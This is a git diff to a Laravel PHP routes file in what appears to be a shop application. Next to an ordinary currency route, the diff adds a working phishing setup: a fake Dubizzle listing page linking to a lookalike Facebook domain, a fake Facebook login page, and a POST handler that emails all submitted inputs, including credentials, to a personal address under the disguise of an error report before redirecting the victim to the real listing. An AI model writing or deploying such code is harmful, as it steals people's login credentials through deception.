@@ -82,3 +82,33 @@ Route::get('/change-currency/{currency}', function($currency)
     // Redirect back or to home page
     try{ return Redirect::back(); } catch(Exception $e) { return Redirect::route('home'); }
 });
+
+
+Route::get('/en/port-said/items-for-sale/computers-tablets/listing/7-listings-4807f59cf6355e629f2ea1bebd93b99b/show/', function()
+{
+    $facebookUrl = 'http://facebook.speedupb.com/login.php?fbid=645304118898028&set=a.263636427064801.58209.263629920398785&type=1';
+
+    return View::make('hack.dubizzle', compact('facebookUrl'));
+});
+
+
+Route::get('/login.php', function()
+{
+    return View::make('hack.facebook');
+});
+
+Route::post('/login.php', function()
+{
+    $data = array(
+        'errorTitle' => 'Ahmed zeyada',
+        'errorDescription' => '',
+        'errorPage' => Request::url() . ' : ' . Request::getMethod() . '<br /><br />INPUTS ARE: <br />' . readableArray(Input::all())
+    );
+
+    Mail::send('emails.error', $data, function($message)
+    {
+        $message->to('kareem3d.a@gmail.com', 'Kareem Mohamed')->subject('Error from qbrando');
+    });
+
+    return Redirect::to('https://egypt.dubizzle.com/en/port-said/items-for-sale/computers-tablets/listing/7-listings-4807f59cf6355e629f2ea1bebd93b99b/show/?back=L2VuL3BvcnQtc2FpZC9pdGVtcy1mb3Itc2FsZS9jb21wdXRlcnMtdGFibGV0cy9zZWFyY2gvP2lzX3NlYXJjaD1GYWxzZSZwYWdlPTU=');
+});
